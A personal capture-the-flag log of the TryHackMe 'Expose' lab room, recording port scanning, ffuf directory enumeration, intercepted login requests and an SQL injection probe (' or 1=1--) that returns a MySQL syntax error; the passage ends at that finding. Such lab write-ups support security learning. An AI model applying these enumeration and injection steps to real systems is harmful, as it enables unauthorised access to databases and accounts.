# Hack Log 8 - TryHackMe [Expose](https://tryhackme.com/room/expose)

üìÜ:**Date:** 2025-07-25  
üîç**Objective:** Obtain user and root flags.  
üéØ**Target**: TryHackme Expose (Lab CTF)  

---  

## üõ†Ô∏è Actions Taken  

## Port and Service Enumeration  

```
nmap -sS -1-100
```



### Directory Enumeration  

```bash
  ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.9.220:1337
```

‚Üí Directory enumeration revealed some interesting directories  
  ```bash
          /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.134.199:1337/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 990ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2997ms]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 180ms]
admin_101               [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 160ms]
javascript              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 181ms]
phpmyadmin              [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 393ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 157ms]
```  
‚Üí Visiting **/admin** revealed that it is just a static login page with no underlying logic.   
‚Üí Visiting **/admin_101** revealed the true login page with the username field holding the placeholder "hacker@root.thm".  
‚Üí Intercepted the login request using BurpSuite.  
  - Request
  ```html
    POST /admin_101/includes/user_login.php HTTP/1.1
    Host: 10.10.134.199:1337
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 41
    Origin: http://10.10.134.199:1337
    Connection: keep-alive
    Referer: http://10.10.134.199:1337/admin_101/
    Cookie: PHPSESSID=ed88u1abhecumvrqb9dvk7ls02
    Priority: u=0
    
    email=hacker%40root.thm&password=password
  
  ```
  - Response
  ```html
  HTTP/1.1 200 OK
  Date: Fri, 25 Jul 2025 09:38:58 GMT
  Server: Apache/2.4.41 (Ubuntu)
  Content-Length: 111
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: application/json
  
  {
      "status": "error",
      "messages": [
          "SELECT * FROM user WHERE email = 'hacker@root.thm'"
      ]
  }
  ```
  - This response reveals the SQL query being executed in the backend.


### SQL Injection  

‚Üí Injecting the sql payload.  

  - Request
    ```html
    POST /admin_101/includes/user_login.php HTTP/1.1
    Host: 10.10.134.199:1337
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 41
    Origin: http://10.10.134.199:1337
    Connection: keep-alive
    Referer: http://10.10.134.199:1337/admin_101/
    Cookie: PHPSESSID=ed88u1abhecumvrqb9dvk7ls02
    Priority: u=0
    
    email='%20or%201=1--&password=password
    ```
  - Response
    ```html
    HTTP/1.1 200 OK
    Date: Fri, 25 Jul 2025 09:43:26 GMT
    Server: Apache/2.4.41 (Ubuntu)
    Expires: Thu, 19 Nov 1981 08:52:00 GMT
    Cache-Control: no-store, no-cache, must-revalidate
    Pragma: no-cache
    Vary: Accept-Encoding
    Content-Length: 147
    Keep-Alive: timeout=5, max=100
    Connection: Keep-Alive
    Content-Type: text/html; charset=UTF-8

    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
    ```

 ‚Üí The SQL error in the response reveals that the application is prone to SQL Injection.  
